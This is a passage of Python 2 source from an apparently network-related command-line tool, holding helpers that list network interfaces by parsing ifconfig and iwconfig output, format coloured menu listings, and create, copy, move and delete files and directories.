    if DebugMode=="2":
        print fcolor.CDebugB + "[DBG]  " + fcolor.CDebug + ptext + fcolor.CReset
        print fcolor.CReset + fcolor.White + "       [Break - Press Any Key To Continue]" + fcolor.CReset
        read_a_key()

def GetInterfaceList(cmdMode):
    global IFaceList
    global IEEEList
    global ModeList
    global MACList
    global IPList
    global BCastList
    global MaskList
    global UpDownList
    global StatusList
    global ISerialList
    global IPv6List
    if cmdMode=="":
        cmdMode="ALL"
    proc  = Popen("ifconfig -a", shell=True, stdout=subprocess.PIPE, stderr=open(os.devnull, 'w'))
    IFACE = ""
    IEEE = ""
    MODE = ""
    MACADDR=""
    IPADDR=""
    IPV6ADDR = ""
    BCAST=""
    MASK=""
    STATUS=""
    IFUP=""
    LANMODE=""
    GATEWAY=""
    IFaceCount=0
    IFaceList = []
    IEEEList = []
    ModeList = []
    MACList = []
    IPList = []
    IPv6List = []
    BCastList = []
    MaskList = []
    StatusList = []
    UpDownList = []
    ISerialList = []
    for line in proc.communicate()[0].split('\n'):
        if len(line) == 0: continue
	if ord(line[0]) != 32:
            printd ("Line : " + str(line))
            IFACE = line[:line.find(' ')]
            IFACE2=IFACE[:2].upper()
            printd ("IFACE : " + str(IFACE))
            printd ("IFACE2 : " + str(IFACE2))

            if IFACE2!="ET" and IFACE2!="LO" and IFACE2!="VM" and IFACE2!="PP" and IFACE2!="AT":
                ps=subprocess.Popen("iwconfig " + str(IFACE) + "| grep -i 'Mode:' | tr -s ' ' | egrep -o 'Mode:..................' | cut -d ' ' -f1 | cut -d ':' -f2" , shell=True, stdout=subprocess.PIPE, stderr=open(os.devnull, 'w'))	
                MODEN=ps.stdout.read().replace("\n","")
                MODE=MODEN.upper()
                ps=subprocess.Popen("iwconfig " + str(IFACE) + "| grep -o 'IEEE..........................' | cut -d ' ' -f2" , shell=True, stdout=subprocess.PIPE)	
                IEEE=ps.stdout.read().replace("\n","").upper().replace("802.11","802.11 ")
                LANMODE="WLAN"
            else:
                MODE="NIL"
                MODEN="Nil"
                IEEE="802.3"
                LANMODE="LAN"

            if IFACE2=="LO":
                MODE="LO"
                MODEN="Loopback"
                IEEE="Nil"
                LANMODE="LO"

            printd ("MODE : " + str(MODE))
            printd ("MODEN : " + str(MODEN))

            ps=subprocess.Popen("ifconfig " + str(IFACE) + " | grep 'HWaddr' | tr -s ' ' | cut -d ' ' -f5" , shell=True, stdout=subprocess.PIPE)	
            MACADDR=ps.stdout.read().replace("\n","").upper().replace("-",":")
            MACADDR=MACADDR[:17]

            ps=subprocess.Popen("ifconfig " + str(IFACE) + " | egrep -o '([0-9]{1,3}\.){3}[0-9]{1,3}' | sed -n '1p'" , shell=True, stdout=subprocess.PIPE)	
            IPADDR=ps.stdout.read().replace("\n","").upper()    

            ps=subprocess.Popen("ifconfig " + str(IFACE) + " | grep -a -i 'inet6 addr:' | tr -s ' ' | sed -n '1p' | cut -d ' ' -f4" , shell=True, stdout=subprocess.PIPE)	
            IPV6ADDR=ps.stdout.read().replace("\n","").upper()

            ps=subprocess.Popen("ifconfig " + str(IFACE) + " | grep '\<Bcast\>' | sed -n '1p' | tr -s ' '  | cut -d ' ' -f4 | cut -d ':' -f2" , shell=True, stdout=subprocess.PIPE)	
            BCAST=ps.stdout.read().replace("\n","").upper()

            ps=subprocess.Popen("ifconfig " + str(IFACE) + " | grep '\<Mask\>' | sed -n '1p' | tr -s ' '  | cut -d ' ' -f5 | cut -d ':' -f2" , shell=True, stdout=subprocess.PIPE)	
            MASK=ps.stdout.read().replace("\n","").upper()

            if cmdMode=="CON":
                ps=subprocess.Popen("netstat -r | grep -a -i '" + str(IFACE) + "'  | awk '{print $2}' | egrep -o '([0-9]{1,3}\.){3}[0-9]{1,3}' | sed -n '1p'" , shell=True, stdout=subprocess.PIPE)	
                GATEWAY=ps.stdout.read().replace("\n","").upper()
            else:
                GATEWAY=""
            printd ("GATEWAY : " + GATEWAY)

            ps=subprocess.Popen("ifconfig " + str(IFACE) + " | grep 'MTU:' | sed -n '1p' | tr -s ' ' | grep -o '.\{0,100\}MTU'" , shell=True, stdout=subprocess.PIPE)	
            STATUS=ps.stdout.read().replace("\n","").upper().replace(" MTU","").lstrip().rstrip()
            ps=subprocess.Popen("ifconfig " + str(IFACE) + " | grep 'MTU:' | sed -n '1p' | tr -s ' ' | grep -o '.\{0,100\}MTU' | cut -d ' ' -f2 | grep 'UP'" , shell=True, stdout=subprocess.PIPE)	
            Result=ps.stdout.read().replace("\n","").upper().lstrip().rstrip()
            if Result=="UP":
                IFUP="Up"
            else:
                IFUP="Down"

            printd ("STATUS : " + str(STATUS))
            printd ("line " + line)
            printd ("IEEE : " + IEEE)
            printd ("MACADDR : " + str(MACADDR))
            printd ("IPADDR : " + str(IPADDR))
            printd ("MASK : " + str(MASK))
            printd ("IFUP : " + str(IFUP))
            printd ("cmdMode := " + str(cmdMode))
            if cmdMode=="ALL":
                IFaceCount=IFaceCount+1
                ModeList.append(str(MODEN))
                IFaceList.append(IFACE)
                IEEEList.append(IEEE)
                MACList.append(MACADDR)
                IPList.append(IPADDR)
                IPv6List.append(IPV6ADDR)
                BCastList.append(BCAST)
                MaskList.append(MASK)
                StatusList.append(STATUS)
                UpDownList.append(IFUP)
                ISerialList.append(str(IFaceCount))
            if MODE=="MANAGED":
                if cmdMode=="MAN":
                    IFaceCount=IFaceCount+1
                    ModeList.append(MODEN)
                    IFaceList.append(IFACE)
                    IEEEList.append(IEEE)
                    MACList.append(MACADDR)
                    IPList.append(IPADDR)
                    IPv6List.append(IPV6ADDR)
                    BCastList.append(BCAST)
                    MaskList.append(MASK)
                    StatusList.append(STATUS)
                    UpDownList.append(IFUP)
                    ISerialList.append(str(IFaceCount))
            if cmdMode=="WLAN" and LANMODE=="WLAN":
                IFaceCount=IFaceCount+1
                ModeList.append(MODEN)
                IFaceList.append(IFACE)
                IEEEList.append(IEEE)
                MACList.append(MACADDR)
                IPList.append(IPADDR)
                IPv6List.append(IPV6ADDR)
                BCastList.append(BCAST) 
                MaskList.append(MASK)
                StatusList.append(STATUS)
                UpDownList.append(IFUP)
                ISerialList.append(str(IFaceCount))
    return IFaceCount;


def RemoveColor(InText):
    if InText!="":
        InText=InText.replace('\033[0m','')
        InText=InText.replace('\033[1m','')
        InText=InText.replace('\033[2m','')
        InText=InText.replace('\033[4m','')
        InText=InText.replace('\033[5m','')
        InText=InText.replace('\033[7m','')
        InText=InText.replace('\033[8m','')
        InText=InText.replace('\033[1;90m','')
        InText=InText.replace('\033[0;90m','')
        InText=InText.replace('\033[30m','')
        InText=InText.replace('\033[31m','')
        InText=InText.replace('\033[32m','')
        InText=InText.replace('\033[33m','')
        InText=InText.replace('\033[34m','')
        InText=InText.replace('\033[35m','')
        InText=InText.replace('\033[36m','')
        InText=InText.replace('\033[37m','')
        InText=InText.replace('\033[0;30m','')
        InText=InText.replace('\033[0;31m','')
        InText=InText.replace('\033[0;32m','')
        InText=InText.replace('\033[0;33m','')
        InText=InText.replace('\033[0;34m','')
        InText=InText.replace('\033[0;35m','')
        InText=InText.replace('\033[0;36m','')
        InText=InText.replace('\033[0;37m','')
        InText=InText.replace('\033[1;30m','')
        InText=InText.replace('\033[1;31m','')
        InText=InText.replace('\033[1;34m','')
        InText=InText.replace('\033[1;33m','')
        InText=InText.replace('\033[1;32m','')
        InText=InText.replace('\033[1;35m','')
        InText=InText.replace('\033[1;36m','')
        InText=InText.replace('\033[1;37m','')
        InText=InText.replace('\033[4;30m','')
        InText=InText.replace('\033[4;31m','')
        InText=InText.replace('\033[4;32m','')
        InText=InText.replace('\033[4;33m','')
        InText=InText.replace('\033[4;34m','')
        InText=InText.replace('\033[4;35m','')
        InText=InText.replace('\033[4;36m','')
        InText=InText.replace('\033[4;37m','')
        InText=InText.replace('\033[0;90m','')
        InText=InText.replace('\033[0;91m','')
        InText=InText.replace('\033[0;92m','')
        InText=InText.replace('\033[0;93m','')
        InText=InText.replace('\033[0;94m','')
        InText=InText.replace('\033[0;95m','')
        InText=InText.replace('\033[0;96m','')
        InText=InText.replace('\033[0;97m','')
        InText=InText.replace('\033[1;90m','')
        InText=InText.replace('\033[1;91m','')
        InText=InText.replace('\033[1;92m','')
        InText=InText.replace('\033[1;93m','')
        InText=InText.replace('\033[1;94m','')
        InText=InText.replace('\033[1;95m','')
        InText=InText.replace('\033[1;96m','')
        InText=InText.replace('\033[1;97m','')
        InText=InText.replace('\033[40m','')
        InText=InText.replace('\033[41m','')
        InText=InText.replace('\033[42m','')
        InText=InText.replace('\033[43m','')
        InText=InText.replace('\033[44m','')
        InText=InText.replace('\033[45m','')
        InText=InText.replace('\033[46m','')
        InText=InText.replace('\033[47m','')
        InText=InText.replace('\033[100m','')
        InText=InText.replace('\033[101m','')
        InText=InText.replace('\033[102m','')
        InText=InText.replace('\033[103m','')
        InText=InText.replace('\033[104m','')
        InText=InText.replace('\033[105m','')
        InText=InText.replace('\033[106m','')
        InText=InText.replace('\033[107m','')
    return InText;

def CombineListing(List1, List2, List3, List4, List5, List6, List7, List8):
    global MergedList
    global MergedSpaceList
    global TitleList
    MergedList=[]
    MergedSpaceList=[]
    TitleList=[]
    CombineText=""
    ListMax1=0
    ListMax2=0
    ListMax3=0
    ListMax4=0
    ListMax5=0
    ListMax6=0
    ListMax7=0
    ListMax8=0

    x=0
    if str(List1)!="":
        while x < len(List1):
            if str(List1[x])!="":
                ETxt=RemoveColor(str(List1[x]))
                if len(ETxt)>ListMax1:
                    ListMax1=len(ETxt)
            x = x +1
        printd ("ListMax1 : " + str(ListMax1))
        ListMax1 = ListMax1 + 4

    x=0
    if str(List2)!="":
        while x < len(List2):
            if str(List2[x])!="":
                ETxt=RemoveColor(str(List2[x]))
                if len(ETxt)>ListMax2:
                    ListMax2=len(ETxt)
            x = x +1
        printd ("ListMax2 : " + str(ListMax2))
        ListMax2 = ListMax2 + 4

    x=0
    if str(List3)!="":
        while x < len(List3):
            if str(List3[x])!="":
                ETxt=RemoveColor(str(List3[x]))
                if len(ETxt)>ListMax3:
                    ListMax3=len(ETxt)
            x = x +1
        printd ("ListMax3 : " + str(ListMax3))
        ListMax3 = ListMax3 + 4
    x=0
    if str(List4)!="":
        while x < len(List4):
            if str(List4[x])!="":
                ETxt=RemoveColor(str(List4[x]))
                if len(ETxt)>ListMax4:
                    ListMax4=len(ETxt)
            x = x +1
        printd ("ListMax4 : " + str(ListMax4))
        ListMax4 = ListMax4 + 4
    x=0
    if str(List5)!="":
        while x < len(List5):
            if str(List5[x])!="":
                ETxt=RemoveColor(str(List5[x]))
                if len(ETxt)>ListMax5:
                    ListMax5=len(ETxt)
            x = x +1
        printd ("ListMax5 : " + str(ListMax5))
        ListMax5 = ListMax5 + 4
    x=0
    if str(List6)!="":
        while x < len(List6):
            if str(List6[x])!="":
                ETxt=RemoveColor(str(List6[x]))
                if len(ETxt)>ListMax6:
                    ListMax6=len(ETxt)
            x = x +1
        printd ("ListMax6 : " + str(ListMax6))
        ListMax6 = ListMax6 + 4
    x=0
    if str(List7)!="":
        while x < len(List7):
            if str(List7[x])!="":
                ETxt=RemoveColor(str(List7[x]))
                if len(ETxt)>ListMax7:
                    ListMax7=len(ETxt)
            x = x +1
        printd ("ListMax7 : " + str(ListMax7))
        ListMax7 = ListMax7 + 4
    x=0
    if str(List8)!="":
        while x < len(List8):
            if str(List8[x])!="":
                ETxt=RemoveColor(str(List8[x]))
                if len(ETxt)>ListMax8:
                    ListMax8=len(ETxt)
            x = x +1
        printd ("ListMax8 : " + str(ListMax8))
        ListMax8 = ListMax8 + 4
    printd ("ListMax1 - After + 4 : " + str(ListMax1))
    printd ("ListMax2 - After + 4 : " + str(ListMax2))
    printd ("ListMax3 - After + 4  : " + str(ListMax3))
    printd ("ListMax4 - After + 4  : " + str(ListMax4))
    printd ("ListMax5 - After + 4  : " + str(ListMax5))
    printd ("ListMax6 - After + 4  : " + str(ListMax6))
    printd ("ListMax7 - After + 4  : " + str(ListMax7))
    printd ("ListMax8 - After + 4  : " + str(ListMax8))
    MergedSpaceList.append(5)
    MergedSpaceList.append(ListMax1)
    MergedSpaceList.append(ListMax2)
    MergedSpaceList.append(ListMax3)
    MergedSpaceList.append(ListMax4)
    MergedSpaceList.append(ListMax5)
    MergedSpaceList.append(ListMax6)
    MergedSpaceList.append(ListMax7)
    MergedSpaceList.append(ListMax8)

    i=0
    while i < len(List1):
        remain1spc=ListMax1 - len(RemoveColor(List1[i]))
        CombineText=List1[i] + "<#&!#>" + " " * remain1spc

        if str(List2)!="":
            if str(List2[i])!="":
                remainspc=ListMax2 - len(RemoveColor(List2[i]))
                CombineText=CombineText  + List2[i] + " " * remainspc
            else:
                CombineText=CombineText + " " * ListMax2
        if str(List3)!="":
            if str(List3[i])!="":
                remainspc=ListMax3 - len(RemoveColor(List3[i]))
                CombineText=CombineText + "" + List3[i] + " " * remainspc
            else:
                CombineText=CombineText + "" + " " * ListMax3
        if str(List4)!="":
            if str(List4[i])!="":
                remainspc=ListMax4 - len(RemoveColor(List4[i]))
                CombineText=CombineText + "" + List4[i] + " " * remainspc
            else:
                CombineText=CombineText + "" + " " * ListMax4
        if str(List5)!="":
            if str(List5[i])!="":
                remainspc=ListMax5 - len(RemoveColor(List5[i]))
                CombineText=CombineText + "" + List5[i] + " " * remainspc
            else:
                CombineText=CombineText + "" + " " * ListMax5
        if str(List6)!="":
            if str(List6[i])!="":
                remainspc=ListMax6 - len(RemoveColor(List6[i]))
                CombineText=CombineText + "" + List6[i] + " " * remainspc
            else:
                CombineText=CombineText + "" + " " * ListMax6
        if str(List7)!="":
            if str(List7[i])!="":
                remainspc=ListMax7 - len(RemoveColor(List7[i]))
                CombineText=CombineText + "" + List7[i] + " " * remainspc
            else:
                CombineText=CombineText + "" + " " * ListMax7
        if str(List8)!="":
            if str(List8[i])!="":
                remainspc=ListMax8 - len(RemoveColor(List8[i]))
                CombineText=CombineText + "" + List8[i] + " " * remainspc
            else:
                CombineText=CombineText + "" + " " * ListMax8


        CombineText=CombineText.lstrip().rstrip()
        MergedList.append(str(CombineText))
        i = i + 1
    return i;



def QuestionFromList(ListTitle,ListTitleSpace,ListUse,AskQuestion,RtnType):
#   RtnType "0" = Return Selected Number
#           "1" = Return first field of selected list number
    global ListingIndex
    ListingIndex=""
    bcolor=fcolor.SWhite
    pcolor=fcolor.BYellow
    ttcolor=fcolor.BBlue
    lcolor=fcolor.SYellow
    scolor=fcolor.BRed
    tcolor=fcolor.BGreen
    x=0
    CombineTitle=""
    totallen=0
    while x < len(ListTitle):
        xlen=len(ListTitle[x])
        remainspc=ListTitleSpace[x] - xlen
        if x==8:
            remainspc = remainspc - 4
            if remainspc<1:
                remainspc=1
        CombineTitle=CombineTitle + ListTitle[x] + " " * remainspc
        x = x +1 
    totallen=len(CombineTitle) + 1
    printl("    ","1","")
    DrawLine("=",fcolor.SWhite,totallen)
    print bcolor + "[" + pcolor + "*" + bcolor + "]  " + ttcolor + str(CombineTitle) + fcolor.CReset
    printl("    ","1","")
    DrawLine("=",fcolor.SWhite,totallen)
    for i, showtext in enumerate(ListUse):
        sn=i + 1
        remainspc = 4 - len(str(sn))
        showtext=showtext.replace("<#&!#>","")
        print "     " +scolor + str(sn) + "." + " " * remainspc + lcolor+ showtext
    printl("    ","1","")
    DrawLine("^",fcolor.SWhite,totallen)
    usr_resp=raw_input (bcolor + "[" + pcolor + "?" + bcolor + "]  " + tcolor + str(AskQuestion) + " [ " + scolor + "1" + tcolor + "-" + scolor + str(sn) + tcolor + " / " + scolor + "0" + fcolor.SWhite + " = Cancel" + tcolor + " ] : " + fcolor.BWhite)
    while not usr_resp.isdigit() or int(usr_resp) < 0 or int(usr_resp) > len(ListUse):
        print ""
        Result=QuestionFromList(ListTitle,ListTitleSpace,ListUse,AskQuestion,RtnType)
        return str(Result)
    if RtnType=="1":
        usr_resp = int(usr_resp) - 1
        ListingIndex=usr_resp
        SelList=ListUse[int(usr_resp)]
        SelList=SelList.replace("<#&!#>","\t")
        SelList=RemoveColor(SelList)
        POS=SelList.find("\t", 2) +1
        SelList=SelList[:POS]
        Rtn=SelList
        ps=subprocess.Popen("echo " + str(SelList) + " | cut -d '\t' -f1" , shell=True, stdout=subprocess.PIPE)	
        Rtn=ps.stdout.read()
        Rtn=Rtn.replace("\n","")
        if usr_resp==-1:
            usr_resp=0
            Rtn="0"
        return Rtn;
    else:
        usr_resp=usr_resp.replace("\n","")
        ListingIndex=usr_resp
        return usr_resp;

def GenerateTmpFile(tmpdir,FilePrefix, FileExt,CreateFile,ShowDisplay):
    import tempfile
    if CreateFile=="":
        CreateFile="0"

    if CreateFile=="1":
        DeleteFile=False
    else:
        DeleteFile=True

    if tmpdir=="":
        tmpdir=tempfile.gettempdir()

    temp = tempfile.NamedTemporaryFile(prefix=FilePrefix, suffix=FileExt, dir=tmpdir, delete=DeleteFile)
    if CreateFile=="1":
        if IsFileDirExist(temp.name)=="F":
            if ShowDisplay=="1":
                printc (" ",fcolor.SGreen + "Temporary File [ " + fcolor.SRed + str(temp.name) + fcolor.SGreen + " ] created.","")
            return temp.name
        else:
            if ShowDisplay=="1":
                printc ("!!",fcolor.SRed + "Temporary File [ " + fcolor.SYellow + str(temp.name) + fcolor.SRed + " ] creation failed.","")
            return ""
    if ShowDisplay=="1":
        printc (" ",fcolor.SGreen + "Generated Temporary File [ " + fcolor.SRed + str(temp.name) + fcolor.SGreen + " ] ...","")
    return temp.name


def GenerateTmpDir(tmpdir,DirPrefix,CreateDir,ShowDisplay):
    import tempfile
    if ShowDisplay=="":
        ShowDisplay=0
    RtnResult=""

    if CreateDir=="":
        CreateDir="0"
        DeleteDir=False
    else:
        DeleteDir=True
    if tmpdir=="":
        tmpdir=tempfile.gettempdir()

    if tmpdir[-1:]!="/":
            tmpdir=tmpdir + "/"

    temp = tempfile.NamedTemporaryFile(prefix="", suffix="", dir=tmpdir, delete=True)
    directory_name = tempfile.mkdtemp(suffix='', prefix=DirPrefix, dir=tmpdir)
    directory_name=directory_name + "/"
    RtnResult=directory_name
    if CreateDir=="1":
        if IsFileDirExist(directory_name)=="D":
            if ShowDisplay=="1":
                printc (" ",fcolor.SGreen + "Temporary Directory [ " + fcolor.SRed + str(directory_name) + fcolor.SGreen + " ] created.","")
            return RtnResult;
        else:
            if ShowDisplay=="1":
                printc ("!!",fcolor.SRed + "Temporary Directory [ " + fcolor.SYellow + str(directory_name) + fcolor.SRed + " ] creation failed.","")
                return "";
            return "";
    Result=RemoveTree(directory_name,"0")
    if ShowDisplay=="1":
        printc (" ",fcolor.SGreen + "Generated Temporary Directory [ " + fcolor.SRed + str(directory_name) + fcolor.SGreen + " ] ...","")
    return temp.name 
def DelFile(strFileName,ShowDisplay):
    import glob, os
    RtnResult=False
    if ShowDisplay=="":
        ShowDisplay=0
    if strFileName.find("*")==-1 and strFileName.find("?")==-1:
        Result=IsFileDirExist(strFileName)
        if Result=="F":
            os.remove(strFileName)
            RtnResult=True
            if ShowDisplay=="1":
                printc (" ",fcolor.SGreen + "File [ " + fcolor.SRed + strFileName + fcolor.SGreen + " ] deleted.","")
        else:
            if ShowDisplay=="1":
                printc ("!!",fcolor.SRed + "File [ " + fcolor.SYellow + strFileName + fcolor.SRed + " ] does not exist.","")
        return RtnResult
    else:
        filelist = glob.glob(strFileName)
        fc=0
        for f in filelist:
            if ShowDisplay=="1":
                printc (" ",fcolor.SGreen + "Deleting [ " + fcolor.SRed + str(f) + fcolor.SGreen + " ]...","")
            os.remove(f)
            fc=fc+1
        if ShowDisplay=="1":
            printc (" ",fcolor.SGreen + "Total [ " + fcolor.BRed + str(fc) + fcolor.SGreen + " ] files deleted.","")
        RtnResult=True
    return RtnResult

def IsFileDirExist(strFilePath):
    """
        Function   : Check if a file/path exist
        Return     : "F" - Exist File 
                   : "D" - Exist Directory
                   : "E" - Does not exist
    """
    RtnResult="E"
    if os.path.exists(strFilePath)==True:
        if os.path.isfile(strFilePath)==True:
            RtnResult="F"
        if os.path.isdir(strFilePath)==True:
            RtnResult="D"
    return RtnResult;

def MakeTree(dirName,ShowDisplay):
    if ShowDisplay=="":
        ShowDisplay=0
    RtnResult=False
    printd ("Make Tree - " + dirName)
    printd ("Check Exists : " + str(os.path.exists(dirName)))
    printd ("IsFileDirExist : " + str(IsFileDirExist(dirName)))

    if not os.path.exists(dirName) or IsFileDirExist(dirName)=="E":
        printd ("Tree - " + dirName + " not found")
        ldir=[]
        splitpath = "/"
        ldir = dirName.split("/")
        i = 1
        while i < len(ldir):
            splitpath = splitpath + ldir[i] + "/"
            i = i + 1
            if not os.path.exists(splitpath):
                if ShowDisplay=="1":
                    printc (" ",fcolor.SGreen + "Creating path [ " + fcolor.SRed + splitpath + fcolor.SGreen + " ] ...","")
                os.mkdir(splitpath, 0755)
                RtnResult=True
        printc (" ",fcolor.SGreen + "Path [ " + fcolor.SRed + dirName + fcolor.SGreen + " ] created...","")
        return RtnResult
    else:
        printd ("Tree - " + dirName + " Found")
        printc ("!!",fcolor.SRed + "Path [ " + fcolor.SYellow + dirName + fcolor.SRed + " ] already exist.","")
        RtnResult=True
        return RtnResult
    return RtnResult

def RemoveTree(dirName,ShowDisplay):
    import shutil
    RtnResult=False
    if ShowDisplay=="":
        ShowDisplay="0"

    if os.path.exists(dirName)==True:
        if ShowDisplay=="1":
            printc (" ",fcolor.SGreen + "Removing Tree [ " + fcolor.SRed + dirName + fcolor.SGreen + " ] ...","")
        shutil.rmtree(dirName)
        RtnResult=True
    else:
        if ShowDisplay=="1":
            printc ("!!",fcolor.SRed + "Path [ " + fcolor.SYellow + dirName + fcolor.SRed + " ] does not exist..","")
        return RtnResult;
    if IsFileDirExist(dirName)=="E":
        RtnResult=True
        if ShowDisplay=="1":
            printc (" ",fcolor.SGreen + "Tree [ " + fcolor.SRed + dirName + fcolor.SGreen + " ] Removed...","")
        return RtnResult
    else:
        return RtnResult

def CopyFile(RootSrcPath,RootDstPath, strFileName,ShowDisplay):
    import shutil
    import glob, os
    RtnResult=False
    if ShowDisplay=="":
        ShowDisplay=0

    if RootSrcPath[-1:]!="/":
        RootSrcPath=RootSrcPath + "/"
    if RootDstPath[-1:]!="/":
        RootDstPath=RootDstPath + "/"

    if strFileName.find("*")==-1 and strFileName.find("?")==-1:
        Result=IsFileDirExist(RootSrcPath + strFileName)
        if Result=="F":
            if not os.path.exists(RootDstPath):
                if ShowDisplay=="1":
                    printc (" ",fcolor.SGreen + "   Making Directory [ " + fcolor.SRed + RootDstPath + fcolor.SGreen + " ] ....","")
                Result=MakeTree(RootDstPath,ShowDisplay)
            if os.path.exists(RootDstPath + strFileName):
                os.remove(RootDstPath + strFileName)
                if ShowDisplay=="1":
                    printc (" ",fcolor.SGreen + "   Removing Existing Destination File [ " + fcolor.SRed + RootDstPath + strFileName + fcolor.SGreen + " ] ....","")
            if ShowDisplay=="1":
                printc (" ",fcolor.SGreen + "   Copying  [ " + fcolor.SWhite + RootSrcPath + strFileName + fcolor.SGreen + " ] to [ " + fcolor.SRed + RootDstPath + strFileName + fcolor.SGreen + " ] ....","")
            shutil.copy(RootSrcPath + strFileName, RootDstPath + strFileName)
            if os.path.exists(RootDstPath + strFileName):
                if ShowDisplay=="1":
                    printc (" ",fcolor.SGreen + "   File copied to [ " + fcolor.SRed + RootDstPath  + strFileName + fcolor.SGreen + " ] ....","")
                RtnResult=True
                return RtnResult;
            else:
                if ShowDisplay=="1":
                    printc ("!!",fcolor.SRed + "   File copying [ " + fcolor.SRed + RootDstPath  + strFileName + fcolor.SGreen + " ] failed....","")
            return RtnResult;
        else:
            if ShowDisplay=="1":
                printc ("!!",fcolor.SRed + "Source File [ " + fcolor.SRed + RootSrcPath  + strFileName + fcolor.SGreen + " ] not found !!","")
            return RtnResult;
    else:
        if not os.path.exists(RootDstPath):
            if ShowDisplay=="1":
                printc (" ",fcolor.SGreen + "   Making Directory [ " + fcolor.SRed + RootDstPath + fcolor.SGreen + " ] ....","")
            Result=MakeTree(RootDstPath,ShowDisplay)
        if ShowDisplay=="1":
            printc (" ",fcolor.SGreen + "   Listing File...." + RootSrcPath + strFileName,"")
        filelist = glob.glob(RootSrcPath + strFileName)
        fc=0
        for file in filelist:
            if os.path.exists(RootDstPath + file):
                os.remove(RootDstPath + file)
                if ShowDisplay=="1":
                    printc (" ",fcolor.SGreen + "   Removing Existing Destination File [ " + fcolor.SRed + RootDstPath + file + fcolor.SGreen + " ] ....","")
            DstFile=file.replace(RootSrcPath,RootDstPath)
            if ShowDisplay=="1":
                printc (" ",fcolor.SGreen + "   Moving  [ " + fcolor.SWhite + file + fcolor.SGreen + " ] to [ " + fcolor.SRed + DstFile + fcolor.SGreen + " ] ....","")
            shutil.copy(file, DstFile)
            if os.path.exists(DstFile):
                fc=fc+1
                if ShowDisplay=="1":
                    printc (" ",fcolor.SGreen + "   File copied to [ " + fcolor.SRed + DstFile + fcolor.SGreen + " ] ....","")
            else:
                if ShowDisplay=="1":
                    printc ("!!",fcolor.SRed + "   File copying [ " + fcolor.SRed + DstFile + fcolor.SGreen + " ] failed....","")
        if ShowDisplay=="1":
            printc (" ",fcolor.BGreen + "Total [ " + fcolor.BRed + str(fc) + fcolor.BGreen + " ] files copied.","")
        RtnResult=fc
    return RtnResult

def MoveFile(RootSrcPath,RootDstPath, strFileName,ShowDisplay):
    import shutil
    import glob, os
    RtnResult=False
    if ShowDisplay=="":
        ShowDisplay=0

    if RootSrcPath[-1:]!="/":
        RootSrcPath=RootSrcPath + "/"
    if RootDstPath[-1:]!="/":
        RootDstPath=RootDstPath + "/"

    if strFileName.find("*")==-1 and strFileName.find("?")==-1:
        Result=IsFileDirExist(RootSrcPath + strFileName)
        if Result=="F":
            if not os.path.exists(RootDstPath):
                if ShowDisplay=="1":
                    printc (" ",fcolor.SGreen + "   Making Directory [ " + fcolor.SRed + RootDstPath + fcolor.SGreen + " ] ....","")
                Result=MakeTree(RootDstPath,ShowDisplay)
            if os.path.exists(RootDstPath + strFileName):
                os.remove(RootDstPath + strFileName)
                if ShowDisplay=="1":
                    printc (" ",fcolor.SGreen + "   Removing Existing Destination File [ " + fcolor.SRed + RootDstPath + strFileName + fcolor.SGreen + " ] ....","")
            if ShowDisplay=="1":
                printc (" ",fcolor.SGreen + "   Moving  [ " + fcolor.SWhite + RootSrcPath + strFileName + fcolor.SGreen + " ] to [ " + fcolor.SRed + RootDstPath + strFileName + fcolor.SGreen + " ] ....","")
            shutil.move(RootSrcPath + strFileName, RootDstPath + strFileName)
            if os.path.exists(RootDstPath + strFileName):
                if ShowDisplay=="1":
                    printc (" ",fcolor.SGreen + "   File moved to [ " + fcolor.SRed + RootDstPath  + strFileName + fcolor.SGreen + " ] ....","")
                RtnResult=True
                return RtnResult;
            else:
                if ShowDisplay=="1":
                    printc ("!!",fcolor.SRed + "   File moving [ " + fcolor.SRed + RootDstPath  + strFileName + fcolor.SGreen + " ] failed....","")
            return RtnResult;
        else:
            if ShowDisplay=="1":
                printc ("!!",fcolor.SRed + "Source File [ " + fcolor.SRed + RootSrcPath  + strFileName + fcolor.SGreen + " ] not found !!","")
            return RtnResult;
    else:
        if not os.path.exists(RootDstPath):
            if ShowDisplay=="1":
                printc (" ",fcolor.SGreen + "   Making Directory [ " + fcolor.SRed + RootDstPath + fcolor.SGreen + " ] ....","")
            Result=MakeTree(RootDstPath,ShowDisplay)
        if ShowDisplay=="1":
            printc (" ",fcolor.SGreen + "   Listing File...." + RootSrcPath + strFileName,"")
        filelist = glob.glob(RootSrcPath + strFileName)
        fc=0
        for file in filelist:
            if os.path.exists(RootDstPath + file):
                os.remove(RootDstPath + file)
                if ShowDisplay=="1":
                    printc (" ",fcolor.SGreen + "   Removing Existing Destination File [ " + fcolor.SRed + RootDstPath + file + fcolor.SGreen + " ] ....","")
            DstFile=file.replace(RootSrcPath,RootDstPath)
            if ShowDisplay=="1":
                printc (" ",fcolor.SGreen + "   Moving  [ " + fcolor.SWhite + file + fcolor.SGreen + " ] to [ " + fcolor.SRed + DstFile + fcolor.SGreen + " ] ....","")
            shutil.move(file, DstFile)
            if os.path.exists(DstFile):
                fc=fc+1
                if ShowDisplay=="1":
                    printc (" ",fcolor.SGreen + "   File moved to [ " + fcolor.SRed + DstFile + fcolor.SGreen + " ] ....","")
            else:
                if ShowDisplay=="1":
                    printc ("!!",fcolor.SRed + "   File moving [ " + fcolor.SRed + DstFile + fcolor.SGreen + " ] failed....","")
        if ShowDisplay=="1":
            printc (" ",fcolor.BGreen + "Total [ " + fcolor.BRed + str(fc) + fcolor.BGreen + " ] files moved.","")
        RtnResult=fc
    return RtnResult

def MoveTree(RootSrcDir,RootDstDir,ShowDisplay):
    import shutil
    if ShowDisplay=="":
        ShowDisplay="0"

    ti=0
    td=0
    for Src_Dir, dirs, files in os.walk(RootSrcDir):
        Dst_Dir = Src_Dir.replace(RootSrcDir, RootDstDir)
        if Src_Dir!=RootSrcDir and Dst_Dir!=RootDstDir:
            td=td+1
            if ShowDisplay=="1":
                print fcolor.SGreen + "        Moving Directory " + "[ " + fcolor.SWhite + Src_Dir + fcolor.CReset + fcolor.SGreen + " ] to [ " + fcolor.SRed + Dst_Dir + fcolor.CReset + fcolor.SGreen + " ] ..."
        if not os.path.exists(Dst_Dir):
            os.mkdir(Dst_Dir)
        for file_ in files:
            SrcFile = os.path.join(Src_Dir, file_)
            DstFile = os.path.join(Dst_Dir, file_)
            if os.path.exists(DstFile):
                os.remove(DstFile)
            if ShowDisplay=="1":
                print fcolor.SGreen + "        Moving File " + "[ " + fcolor.SWhite + SrcFile + fcolor.CReset + fcolor.SGreen + " ] to [ " + fcolor.SRed + DstFile + fcolor.CReset + fcolor.SGreen + " ] ..."
            shutil.move(SrcFile, Dst_Dir)
